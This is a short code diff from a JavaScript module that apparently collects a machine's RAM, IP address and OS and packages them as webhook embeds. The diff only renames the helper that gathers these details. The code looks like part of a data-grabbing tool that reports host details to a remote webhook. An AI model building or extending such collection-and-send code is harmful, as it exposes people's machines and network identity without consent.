@@ -3,8 +3,8 @@ const {
 } = require('../../utils/request/webhook.js');
 
 const { 
-    systemInfo 
-} = require('../../utils/harware/systemInfo.js');
+    getSystem 
+} = require('../../utils/harware/getSystem.js');
 
 module.exports = async (webhookUrl) => {
     const { 
@@ -21,7 +21,7 @@ module.exports = async (webhookUrl) => {
         RAM,
         IP,
         OS,
-    } = await systemInfo();
+    } = await getSystem();
 
     const data = {
         embeds: [
